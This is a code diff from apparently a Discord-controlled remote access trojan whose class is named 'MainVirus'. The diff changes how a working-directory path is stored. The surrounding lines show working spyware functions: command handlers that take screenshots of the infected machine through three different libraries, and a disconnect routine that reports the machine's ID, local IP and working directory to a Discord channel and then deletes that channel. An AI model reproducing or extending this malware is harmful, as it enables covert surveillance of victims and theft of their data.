@@ -91,11 +91,11 @@ class MainVirus:  # Making a class to wrap code cause organisation
         async def onConfirm(event):  # Creates the event function - runs on event
             if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
                 try:
-                    os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                    os.makedirs(os.path.join(self.cwd, "screenshot"))  # Attempts to create a screenshots folder
                 except:
                     pass
                 now = datetime.datetime.now()  # Gets the current time
-                fileLoc = os.path.join(os.getcwd(), "screenshot",
+                fileLoc = os.path.join(self.cwd, "screenshot",
                                        f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
                 await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
                 with mss() as sct:
@@ -108,11 +108,11 @@ class MainVirus:  # Making a class to wrap code cause organisation
         async def onConfirm(event):  # Creates the event function - runs on event
             if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
                 try:
-                    os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                    os.makedirs(os.path.join(self.cwd, "screenshot"))  # Attempts to create a screenshots folder
                 except:
                     pass
                 now = datetime.datetime.now()  # Gets the current time
-                fileLoc = os.path.join(os.getcwd(), "screenshot",
+                fileLoc = os.path.join(self.cwd, "screenshot",
                                        f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
                 await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
                 screenshot = pyautogui.screenshot()  # Takes a screenshot
@@ -137,10 +137,10 @@ class MainVirus:  # Making a class to wrap code cause organisation
         @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
         async def onConfirm(event):  # Creates the event function - runs on event
             if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
-                try: os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                try: os.makedirs(os.path.join(self.cwd, "screenshot"))  # Attempts to create a screenshots folder
                 except: pass
                 now = datetime.datetime.now()  # Gets the current time
-                fileLoc = os.path.join(os.getcwd(), "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
+                fileLoc = os.path.join(self.cwd, "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
                 await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
                 screenshot = ImageGrab.grab()  # Takes a screenshot
                 screenshot.save(fileLoc)  # Saves screenshot
@@ -158,7 +158,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
                     f"@everyone **CONNECTION LOST :(**\n"
                     f"**ID: **||{self.id}||\n"
                     f"**IP: **||{socket.gethostbyname(socket.gethostname())}||\n"
-                    f"**CWD: **||{os.getcwd()}||\n"
+                    f"**CWD: **||{self.cwd}||\n"
                     f"{'-' * 20}\n"
                 )
                 await self.bot.rest.delete_channel(self.channel_id)  # Deletes the connection channel
